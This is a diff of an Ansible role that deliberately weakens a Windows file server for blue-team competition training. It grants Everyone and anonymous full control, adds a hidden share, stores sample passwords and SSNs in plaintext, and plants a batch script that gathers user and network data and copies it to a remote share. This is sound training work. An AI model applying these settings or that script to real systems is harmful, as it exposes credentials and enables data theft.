@@ -1,18 +1,24 @@
 ---
 # =============================================================================
-# CCDC File Services Role
-# Configures Windows File Server with SMB shares
+# CCDC File Services Role - VULNERABLE VERSION
 # =============================================================================
-# This role sets up:
-# - File Server feature installation
-# - SMB share creation with proper permissions
-# - Sample corporate file structure
-# - Basic DFS if needed
+# WARNING: This role INTENTIONALLY introduces security vulnerabilities
+# for blue team training purposes. DO NOT use in production!
+#
+# Vulnerabilities introduced:
+# - V-FS-001: Everyone full control on shares
+# - V-FS-002: Sensitive files in public locations
+# - V-FS-003: Passwords stored in plaintext files
+# - V-FS-004: Open administrative shares
+# - V-FS-005: No file screening/restrictions
+# - V-FS-006: Weak NTFS permissions
+# - V-FS-007: Hidden share with sensitive data
+# - V-FS-008: World-writable directories
 # =============================================================================
 
 - name: Display role information
   ansible.builtin.debug:
-    msg: "Configuring File Services on {{ inventory_hostname }}"
+    msg: "Configuring VULNERABLE File Services on {{ inventory_hostname }}"
 
 # =============================================================================
 # Install File Server Role
@@ -25,15 +31,8 @@
   register: fs_install
   tags: [install]
 
-- name: Install File Server Resource Manager (FSRM)
-  ansible.windows.win_feature:
-    name: FS-Resource-Manager
-    state: present
-    include_management_tools: true
-  tags: [install]
-
 # =============================================================================
-# Create Share Directory Structure
+# Create Directory Structure
 # =============================================================================
 - name: Create main share directory
   ansible.windows.win_file:
@@ -63,157 +62,274 @@
     - Software
     - Scripts
     - Backups
+    - Passwords
   tags: [shares]
 
 # =============================================================================
-# Create SMB Share
+# V-FS-001: Create SMB Share with Everyone Full Control
 # =============================================================================
-- name: Create main SMB share
+- name: "VULN V-FS-001: Create main SMB share with Everyone Full Control"
   ansible.windows.win_powershell:
     script: |
       $shareName = "{{ file_share_name | default('SharedFiles') }}"
       $sharePath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}"
-      $description = "{{ file_share_description | default('Corporate File Share') }}"
 
-      # Check if share exists
       $existingShare = Get-SmbShare -Name $shareName -ErrorAction SilentlyContinue
 
       if ($existingShare) {
-        Write-Output "Share '$shareName' already exists"
+        Remove-SmbShare -Name $shareName -Force
       }
-      else {
-        # Create the share
-        New-SmbShare -Name $shareName -Path $sharePath -Description $description -FullAccess "Domain Admins" -ChangeAccess "Domain Users" -ReadAccess "Everyone"
-        Write-Output "Created share: $shareName"
-      }
-  tags: [shares]
 
-- name: Create departmental shares
+      # VULNERABLE: Everyone has full control
+      New-SmbShare -Name $shareName -Path $sharePath -Description "Corporate File Share" -FullAccess "Everyone"
+      Write-Output "Created vulnerable share with Everyone Full Control: $shareName"
+  tags: [vulnerability, shares]
+
+# =============================================================================
+# V-FS-007: Create Hidden Share with Sensitive Data
+# =============================================================================
+- name: Create hidden admin share directory
+  ansible.windows.win_file:
+    path: "C:\\AdminData"
+    state: directory
+  tags: [vulnerability, shares]
+
+- name: "VULN V-FS-007: Create hidden share for admin data"
   ansible.windows.win_powershell:
     script: |
-      $depts = @("IT", "HR", "Finance", "Sales", "Marketing")
-      $basePath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}"
+      $shareName = "AdminData$"
+      $sharePath = "C:\AdminData"
 
-      foreach ($dept in $depts) {
-        $shareName = "$dept`$"  # Hidden share
-        $sharePath = "$basePath\$dept"
+      $existingShare = Get-SmbShare -Name $shareName -ErrorAction SilentlyContinue
 
-        $existingShare = Get-SmbShare -Name $shareName -ErrorAction SilentlyContinue
-
-        if (-not $existingShare) {
-          New-SmbShare -Name $shareName -Path $sharePath -Description "$dept Department Share" -FullAccess "Domain Admins", "$dept"
-          Write-Output "Created share: $shareName"
-        }
-        else {
-          Write-Output "Share '$shareName' already exists"
-        }
+      if (-not $existingShare) {
+        New-SmbShare -Name $shareName -Path $sharePath -Description "Admin Data" -FullAccess "Everyone"
+        Write-Output "Created hidden share: $shareName"
       }
-  tags: [shares]
+  tags: [vulnerability, shares]
 
 # =============================================================================
-# Configure NTFS Permissions
+# V-FS-003: Store Passwords in Plaintext Files
 # =============================================================================
-- name: Configure NTFS permissions on share root
+- name: "VULN V-FS-003: Create passwords.txt in IT folder"
+  ansible.windows.win_copy:
+    content: |
+      ================================================================================
+      IT DEPARTMENT - SYSTEM PASSWORDS
+      CONFIDENTIAL - DO NOT SHARE
+      Last Updated: {{ ansible_date_time.date | default('2024-01-15') }}
+      ================================================================================
+
+      DOMAIN ACCOUNTS:
+      ----------------
+      Domain Admin (itmgr): ITManager2024!
+      Backup Service (svc_backup): admin
+      Help Desk: helpdesk
+
+      LOCAL ADMIN PASSWORDS:
+      ----------------------
+      DC01: LocalAdmin123!
+      WEB01: WebServer2024!
+      DB01: Database2024!
+      WS01: Workstation2024!
+
+      DATABASE CREDENTIALS:
+      ---------------------
+      MySQL Root: MySQLRoot123!
+      webapp user: WebApp2024!
+      hrapp user: HRApp2024!
+
+      NETWORK DEVICES:
+      ----------------
+      Router Admin: admin / admin123
+      Switch: cisco / cisco123
+      Firewall: pfsense / pfsense
+
+      ================================================================================
+      Remember to change these passwords quarterly!
+      ================================================================================
+    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\IT\\Passwords\\passwords.txt"
+  tags: [vulnerability, credentials]
+
+- name: "VULN V-FS-003: Create service account credentials file"
+  ansible.windows.win_copy:
+    content: |
+      Service Account Credentials
+      ---------------------------
+
+      svc_backup:admin
+      svc_sql:SQLService123
+      svc_web:WebService123
+      svc_monitor:Monitor123
+
+      SSH Keys Location: \\DC01\AdminData$\ssh_keys\
+
+    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\IT\\Documentation\\service_accounts.txt"
+  tags: [vulnerability, credentials]
+
+- name: "VULN V-FS-003: Create credentials in AdminData"
+  ansible.windows.win_copy:
+    content: |
+      MASTER CREDENTIALS LIST
+      =======================
+
+      AWS Access Key: AKIAIOSFODNN7EXAMPLE
+      AWS Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+      Azure Tenant ID: 12345678-1234-1234-1234-123456789012
+      Azure Client Secret: MyAzureSecret123!
+
+      Backup Encryption Key: BackupKey2024!SuperSecret
+
+      VPN Pre-shared Key: VPNSecret2024!
+
+      SNMP Community String: public
+
+    dest: "C:\\AdminData\\master_credentials.txt"
+  tags: [vulnerability, credentials]
+
+# =============================================================================
+# V-FS-002: Sensitive Files in Public Locations
+# =============================================================================
+- name: "VULN V-FS-002: Create HR data in wrong location"
+  ansible.windows.win_copy:
+    content: |
+      EMPLOYEE SALARY INFORMATION - CONFIDENTIAL
+      ==========================================
+
+      Name                  | Position           | Salary    | SSN
+      ---------------------|-------------------|-----------|------------
+      Alex Thompson        | IT Manager        | $95,000   | 123-45-6789
+      John Smith          | Sales Rep         | $65,000   | 234-56-7890
+      Maria Johnson       | HR Coordinator    | $70,000   | 345-67-8901
+      Brian Williams      | Accountant        | $72,000   | 456-78-9012
+      Sarah Lee           | Help Desk         | $55,000   | 567-89-0123
+      David Garcia        | Marketing         | $60,000   | 678-90-1234
+      Kevin Wong          | Developer         | $85,000   | 789-01-2345
+
+    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\Public\\employee_salaries.xlsx.txt"
+  tags: [vulnerability, data]
+
+- name: "VULN V-FS-002: Create network diagram in public"
+  ansible.windows.win_copy:
+    content: |
+      NETWORK INFRASTRUCTURE - INTERNAL USE ONLY
+      ==========================================
+
+      IP Addressing Scheme:
+      - Domain Controllers: 10.X.10.10-19
+      - Servers: 10.X.10.20-49
+      - Workstations: 10.X.10.50-99
+      - Printers: 10.X.10.200-220
+      - Management: 10.X.10.250-254
+
+      Firewall Rules:
+      - DMZ: 10.X.20.0/24
+      - Guest WiFi: 10.X.30.0/24
+
+      Admin Access:
+      - Management VLAN: 10.X.250.0/24
+      - SSH Jump Host: 10.X.10.254
+
+      Default Gateway: 10.X.10.254
+      DNS Servers: 10.X.10.10, 8.8.8.8
+
+    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\Public\\network_diagram.txt"
+  tags: [vulnerability, data]
+
+# =============================================================================
+# V-FS-006: Set Weak NTFS Permissions
+# =============================================================================
+- name: "VULN V-FS-006: Set weak NTFS permissions (Everyone Full Control)"
   ansible.windows.win_powershell:
     script: |
       $sharePath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}"
 
-      # Reset and configure permissions
+      # Reset permissions
       $acl = Get-Acl $sharePath
 
-      # Remove inheritance and copy existing permissions
-      $acl.SetAccessRuleProtection($true, $true)
+      # Remove inheritance
+      $acl.SetAccessRuleProtection($true, $false)
 
-      # Add Domain Users - Read & Execute
-      $domainUsers = New-Object System.Security.AccessControl.FileSystemAccessRule("{{ domain_netbios | default('BLUE') }}\Domain Users", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($domainUsers)
-
-      # Add Domain Admins - Full Control
-      $domainAdmins = New-Object System.Security.AccessControl.FileSystemAccessRule("{{ domain_netbios | default('BLUE') }}\Domain Admins", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($domainAdmins)
+      # Add Everyone - Full Control (VULNERABLE)
+      $everyone = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+      $acl.AddAccessRule($everyone)
 
       Set-Acl $sharePath $acl
-      Write-Output "NTFS permissions configured on $sharePath"
-  tags: [permissions]
-
-- name: Configure departmental folder permissions
-  ansible.windows.win_powershell:
-    script: |
-      $basePath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}"
-      $deptPath = "$basePath\{{ item }}"
-      $deptGroup = "{{ item }}"
-      $domainNetbios = "{{ domain_netbios | default('BLUE') }}"
-
-      # Get current ACL
-      $acl = Get-Acl $deptPath
-
-      # Disable inheritance and copy existing rules
-      $acl.SetAccessRuleProtection($true, $true)
-
-      # Remove all non-inherited permissions
-      $acl.Access | Where-Object { -not $_.IsInherited } | ForEach-Object {
-        $acl.RemoveAccessRule($_) | Out-Null
-      }
-
-      # Add SYSTEM - Full Control
-      $system = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($system)
-
-      # Add Administrators - Full Control
-      $admins = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Administrators", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($admins)
-
-      # Add Domain Admins - Full Control
-      $domainAdmins = New-Object System.Security.AccessControl.FileSystemAccessRule("$domainNetbios\Domain Admins", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($domainAdmins)
-
-      # Add Department Group - Modify
-      try {
-        $deptGroupRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$domainNetbios\$deptGroup", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow")
-        $acl.AddAccessRule($deptGroupRule)
-      }
-      catch {
-        Write-Output "Warning: Could not add group $deptGroup - may not exist yet"
-      }
-
-      Set-Acl $deptPath $acl
-      Write-Output "Permissions configured for $deptPath"
-  loop:
-    - IT
-    - HR
-    - Finance
-    - Sales
-    - Marketing
-  ignore_errors: true
-  tags: [permissions]
-
-- name: Configure Public folder - all users can write
-  ansible.windows.win_powershell:
-    script: |
-      $publicPath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\Public"
-      $domainNetbios = "{{ domain_netbios | default('BLUE') }}"
-
-      $acl = Get-Acl $publicPath
-      $acl.SetAccessRuleProtection($true, $true)
-
-      # SYSTEM - Full Control
-      $system = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($system)
-
-      # Administrators - Full Control
-      $admins = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Administrators", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($admins)
-
-      # Domain Users - Modify (read/write)
-      $domainUsers = New-Object System.Security.AccessControl.FileSystemAccessRule("$domainNetbios\Domain Users", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow")
-      $acl.AddAccessRule($domainUsers)
-
-      Set-Acl $publicPath $acl
-      Write-Output "Public folder permissions configured"
-  tags: [permissions]
+      Write-Output "Set vulnerable NTFS permissions on $sharePath"
+  tags: [vulnerability, permissions]
 
 # =============================================================================
-# Create Sample Files for Training
+# V-FS-008: Create World-Writable Upload Directory
+# =============================================================================
+- name: Create uploads directory
+  ansible.windows.win_file:
+    path: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\Public\\Uploads"
+    state: directory
+  tags: [vulnerability, shares]
+
+- name: "VULN V-FS-008: Set uploads directory as world-writable"
+  ansible.windows.win_powershell:
+    script: |
+      $uploadsPath = "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\Public\Uploads"
+
+      $acl = Get-Acl $uploadsPath
+      $acl.SetAccessRuleProtection($true, $false)
+
+      # Everyone Full Control
+      $everyone = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+      $acl.AddAccessRule($everyone)
+
+      # Anonymous Full Control
+      $anon = New-Object System.Security.AccessControl.FileSystemAccessRule("ANONYMOUS LOGON", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+      $acl.AddAccessRule($anon)
+
+      Set-Acl $uploadsPath $acl
+      Write-Output "Created world-writable uploads directory"
+  tags: [vulnerability, permissions]
+
+# =============================================================================
+# V-FS-004: Enable Open Administrative Shares
+# =============================================================================
+- name: "VULN V-FS-004: Ensure administrative shares are accessible"
+  ansible.windows.win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
+    name: AutoShareWks
+    data: 1
+    type: dword
+  tags: [vulnerability, shares]
+
+- name: "VULN V-FS-004: Ensure admin share permissions are weak"
+  ansible.windows.win_regedit:
+    path: HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
+    name: AutoShareServer
+    data: 1
+    type: dword
+  tags: [vulnerability, shares]
+
+# =============================================================================
+# Create Suspicious Executable in Share
+# =============================================================================
+- name: "VULN: Create suspicious batch file"
+  ansible.windows.win_copy:
+    content: |
+      @echo off
+      REM System maintenance script - DO NOT DELETE
+      REM Runs nightly to collect system information
+
+      net user > C:\Windows\Temp\users.txt
+      net localgroup administrators >> C:\Windows\Temp\users.txt
+      ipconfig /all > C:\Windows\Temp\network.txt
+      netstat -an >> C:\Windows\Temp\network.txt
+
+      REM Upload to central server
+      copy C:\Windows\Temp\*.txt \\10.0.0.100\data\ 2>nul
+
+    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\IT\\Scripts\\system_maintenance.bat"
+  tags: [vulnerability, persistence]
+
+# =============================================================================
+# Create Sample Legitimate Files
 # =============================================================================
 - name: Create sample readme in Public folder
   ansible.windows.win_copy:
@@ -223,70 +339,13 @@
       ================================================================================
 
       Welcome to the corporate file share!
-
-      This is the public folder where all employees can share files.
       Please follow company policy when storing files here.
 
-      For department-specific files, please use your department's folder.
-
-      Questions? Contact the IT Help Desk at helpdesk@blue.lab
-
+      Questions? Contact IT at helpdesk@blue.lab
       ================================================================================
     dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\Public\\README.txt"
   tags: [samples]
 
-- name: Create IT documentation sample
-  ansible.windows.win_copy:
-    content: |
-      ================================================================================
-      IT Department - Internal Documentation
-      ================================================================================
-
-      Network Information:
-      - Domain: {{ domain_name | default('blue.lab') }}
-      - Domain Controller: DC01.{{ domain_name | default('blue.lab') }}
-      - Web Server: WEB01.{{ domain_name | default('blue.lab') }}
-      - Database Server: DB01.{{ domain_name | default('blue.lab') }}
-
-      Important Contacts:
-      - IT Manager: Alex Thompson (itmgr@{{ domain_name | default('blue.lab') }})
-      - Help Desk: Sarah Lee (slee@{{ domain_name | default('blue.lab') }})
-
-      ================================================================================
-      CONFIDENTIAL - IT DEPARTMENT USE ONLY
-      ================================================================================
-    dest: "{{ file_share_path | default('C:\\Shares\\SharedFiles') }}\\IT\\Documentation\\network-info.txt"
-  tags: [samples]
-
-# =============================================================================
-# Configure File Server Resource Manager (Optional)
-# =============================================================================
-- name: Configure FSRM file screening (block executables in shares)
-  ansible.windows.win_powershell:
-    script: |
-      # Enable file screening to block executables (common security practice)
-      Import-Module FileServerResourceManager
-
-      # Check if file group exists
-      $fileGroup = Get-FsrmFileGroup -Name "Executable Files" -ErrorAction SilentlyContinue
-
-      if (-not $fileGroup) {
-        New-FsrmFileGroup -Name "Executable Files" -IncludePattern @("*.exe", "*.com", "*.bat", "*.cmd", "*.ps1", "*.vbs", "*.js")
-        Write-Output "Created file group: Executable Files"
-      }
-
-      # Create file screen template
-      $template = Get-FsrmFileScreenTemplate -Name "Block Executables" -ErrorAction SilentlyContinue
-
-      if (-not $template) {
-        New-FsrmFileScreenTemplate -Name "Block Executables" -IncludeGroup "Executable Files" -Active:$false
-        Write-Output "Created file screen template: Block Executables"
-      }
-
-      Write-Output "FSRM configuration complete (screening disabled by default)"
-  ignore_errors: true
-  tags: [fsrm]
-
 - name: Display completion message
   ansible.builtin.debug:
-    msg: "File Services configuration completed on {{ inventory_hostname }}"
+    msg: "VULNERABLE File Services configuration completed on {{ inventory_hostname }}"
